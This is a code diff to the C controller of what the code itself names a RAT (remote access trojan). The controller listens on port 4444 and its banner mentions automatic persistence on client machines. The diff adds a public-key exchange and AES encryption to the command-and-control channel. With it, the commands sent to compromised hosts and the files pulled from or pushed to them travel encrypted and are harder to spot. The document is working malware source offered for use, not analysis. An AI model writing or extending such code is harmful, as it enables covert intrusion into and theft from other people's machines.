@@ -28,6 +28,8 @@
 
 #include <sys/stat.h>
 
+#include "../include/crypto.h"
+
 #define PORT 4444
 #define BUFFER_SIZE 4096
 #define MAX_COMMAND_SIZE 1024
@@ -44,6 +46,7 @@ typedef struct {
 #endif
     struct sockaddr_in address;
     struct sockaddr_in client_addr;
+    crypto_context_t crypto_ctx;
 } RAT_SERVER;
 
 void print_banner() {
@@ -65,6 +68,102 @@ void print_banner() {
     printf("  The prompt shows the current OS and directory\n");
     printf("  Persistence is installed automatically on client startup\n");
     printf("======================================================\n");
+}
+
+int perform_key_exchange(RAT_SERVER *server);
+
+int perform_key_exchange(RAT_SERVER *server) {
+    unsigned char *our_public_key = NULL;
+    int our_key_len = 0;
+    unsigned char *peer_public_key = NULL;
+    int peer_key_len = 0;
+    unsigned char *encrypted_aes_key = NULL;
+    int encrypted_key_len = 0;
+    int result = -1;
+    
+    // Export our public key
+    if (crypto_export_public_key(&server->crypto_ctx, &our_public_key, &our_key_len) != 0) {
+        printf("Error: Failed to export public key\n");
+        goto cleanup;
+    }
+    
+    // Send our public key length and key
+    uint32_t key_len_net = htonl(our_key_len);
+    if (send(server->client_fd, &key_len_net, sizeof(key_len_net), 0) != sizeof(key_len_net)) {
+        printf("Error: Failed to send public key length\n");
+        goto cleanup;
+    }
+    
+    if (send(server->client_fd, our_public_key, our_key_len, 0) != our_key_len) {
+        printf("Error: Failed to send public key\n");
+        goto cleanup;
+    }
+    
+    // Receive peer's public key length
+    uint32_t peer_key_len_net;
+    if (recv(server->client_fd, &peer_key_len_net, sizeof(peer_key_len_net), 0) != sizeof(peer_key_len_net)) {
+        printf("Error: Failed to receive peer public key length\n");
+        goto cleanup;
+    }
+    peer_key_len = ntohl(peer_key_len_net);
+    
+    if (peer_key_len <= 0 || peer_key_len > 4096) {
+        printf("Error: Invalid peer public key length\n");
+        goto cleanup;
+    }
+    
+    // Receive peer's public key
+    peer_public_key = malloc(peer_key_len);
+    if (!peer_public_key) {
+        printf("Error: Memory allocation failed\n");
+        goto cleanup;
+    }
+    
+    if (recv(server->client_fd, peer_public_key, peer_key_len, 0) != peer_key_len) {
+        printf("Error: Failed to receive peer public key\n");
+        goto cleanup;
+    }
+    
+    // Import peer's public key
+    if (crypto_import_public_key(&server->crypto_ctx, peer_public_key, peer_key_len) != 0) {
+        printf("Error: Failed to import peer public key\n");
+        goto cleanup;
+    }
+    
+    // Server generates AES key and sends it to client
+    if (crypto_generate_aes_key(&server->crypto_ctx) != 0) {
+        printf("Error: Failed to generate AES key\n");
+        goto cleanup;
+    }
+    
+    // Encrypt AES key with peer's public key
+    if (crypto_encrypt_aes_key(&server->crypto_ctx, &encrypted_aes_key, &encrypted_key_len) != 0) {
+        printf("Error: Failed to encrypt AES key\n");
+        goto cleanup;
+    }
+    
+    // Send encrypted AES key length and key
+    uint32_t enc_key_len_net = htonl(encrypted_key_len);
+    if (send(server->client_fd, &enc_key_len_net, sizeof(enc_key_len_net), 0) != sizeof(enc_key_len_net)) {
+        printf("Error: Failed to send encrypted key length\n");
+        goto cleanup;
+    }
+    
+    if (send(server->client_fd, encrypted_aes_key, encrypted_key_len, 0) != encrypted_key_len) {
+        printf("Error: Failed to send encrypted AES key\n");
+        goto cleanup;
+    }
+    
+    // Mark encryption as active
+    server->crypto_ctx.is_encrypted = 1;
+    result = 0;
+    
+cleanup:
+    if (our_public_key) free(our_public_key);
+    if (peer_public_key) free(peer_public_key);
+    if (encrypted_aes_key) free(encrypted_aes_key);
+    
+    return result;
 }
 
 int setup_server(RAT_SERVER *server) {
@@ -147,12 +246,35 @@ int accept_client(RAT_SERVER *server) {
         return -1;
     }
     
-    // Receive client information
-    memset(client_info, 0, BUFFER_SIZE);
-    recv(server->client_fd, client_info, BUFFER_SIZE - 1, 0);
+    // Initialize crypto context for server
+    if (crypto_init(&server->crypto_ctx, 1) != 0) {
+        printf("Error: Failed to initialize encryption\n");
+        close(server->client_fd);
+        server->client_fd = INVALID_SOCKET;
+        return -1;
+    }
     
-    printf("[*] Connection established with %s\n", client_info);
+    // Perform key exchange
+    if (perform_key_exchange(server) != 0) {
+        printf("Error: Key exchange failed\n");
+        crypto_cleanup(&server->crypto_ctx);
+        close(server->client_fd);
+        server->client_fd = INVALID_SOCKET;
+        return -1;
+    }
+    
+    // Receive client information (now encrypted)
+    memset(client_info, 0, BUFFER_SIZE);
+    int bytes_received = crypto_recv(server->client_fd, &server->crypto_ctx, client_info, BUFFER_SIZE - 1, 0);
+    if (bytes_received > 0) {
+        client_info[bytes_received] = '\0';
+        printf("[*] Connection established with %s\n", client_info);
+    } else {
+        printf("[*] Connection established (client info not available)\n");
+    }
     printf("[*] Client IP: %s\n", inet_ntoa(server->client_addr.sin_addr));
+    printf("[*] Encrypted communication established\n");
+    
     return 0;
 }
 
@@ -171,7 +293,7 @@ void send_command(RAT_SERVER *server, const char *command) {
     
     snprintf(command_with_newline, sizeof(command_with_newline), "%s\n", command);
     
-    int bytes_sent = send(server->client_fd, command_with_newline, strlen(command_with_newline), 0);
+    int bytes_sent = crypto_send(server->client_fd, &server->crypto_ctx, command_with_newline, strlen(command_with_newline), 0);
     if (bytes_sent <= 0) {
 #ifdef _WIN32
         printf("Error: Failed to send command to client (WSA Error: %d)\n", WSAGetLastError());
@@ -219,7 +341,7 @@ void receive_response(RAT_SERVER *server) {
     
     while (total_received < max_response_size) {
         memset(buffer, 0, BUFFER_SIZE);
-        bytes_received = recv(server->client_fd, buffer, BUFFER_SIZE - 1, 0);
+        bytes_received = crypto_recv(server->client_fd, &server->crypto_ctx, buffer, BUFFER_SIZE - 1, 0);
         
         if (bytes_received > 0) {
             buffer[bytes_received] = '\0';
@@ -375,7 +497,7 @@ void handle_download(RAT_SERVER *server, const char *remote_filename, const char
     }
     printf("\n");
     
-    while ((bytes_received = recv(server->client_fd, buffer, BUFFER_SIZE, 0)) > 0) {
+    while ((bytes_received = crypto_recv(server->client_fd, &server->crypto_ctx, buffer, BUFFER_SIZE, 0)) > 0) {
         size_t bytes_written = fwrite(buffer, 1, bytes_received, file);
         if (bytes_written != (size_t)bytes_received) {
             printf("Error: Failed to write data to file (wrote %zu of %d bytes)\n", bytes_written, bytes_received);
@@ -460,7 +582,7 @@ void handle_upload(RAT_SERVER *server, const char *filename, const char *destina
         snprintf(upload_info, sizeof(upload_info), "|%s\n", base_filename);
     }
     
-    int bytes_sent = send(server->client_fd, upload_info, strlen(upload_info), 0);
+    int bytes_sent = crypto_send(server->client_fd, &server->crypto_ctx, upload_info, strlen(upload_info), 0);
     if (bytes_sent <= 0) {
 #ifdef _WIN32
         printf("Error: Failed to send upload info (WSA Error: %d)\n", WSAGetLastError());
@@ -473,7 +595,7 @@ void handle_upload(RAT_SERVER *server, const char *filename, const char *destina
     
     // Wait for acknowledgment from client before sending file content
     char ack[10];
-    int ack_received = recv(server->client_fd, ack, sizeof(ack), 0);
+    int ack_received = crypto_recv(server->client_fd, &server->crypto_ctx, ack, sizeof(ack), 0);
     if (ack_received <= 0) {
 #ifdef _WIN32
         printf("Error: Failed to receive acknowledgment from client (WSA Error: %d)\n", WSAGetLastError());
@@ -486,7 +608,7 @@ void handle_upload(RAT_SERVER *server, const char *filename, const char *destina
     
     // Send file content
     while ((bytes_read = fread(buffer, 1, BUFFER_SIZE, file)) > 0) {
-        bytes_sent = send(server->client_fd, buffer, bytes_read, 0);
+        bytes_sent = crypto_send(server->client_fd, &server->crypto_ctx, buffer, bytes_read, 0);
         if (bytes_sent <= 0) {
 #ifdef _WIN32
             printf("Error: Failed to send file data (WSA Error: %d)\n", WSAGetLastError());
@@ -641,6 +763,7 @@ void cleanup(RAT_SERVER *server) {
     if (server->server_fd > 0) {
         close(server->server_fd);
     }
+    crypto_cleanup(&server->crypto_ctx);
 #ifdef _WIN32
     WSACleanup();
 #endif
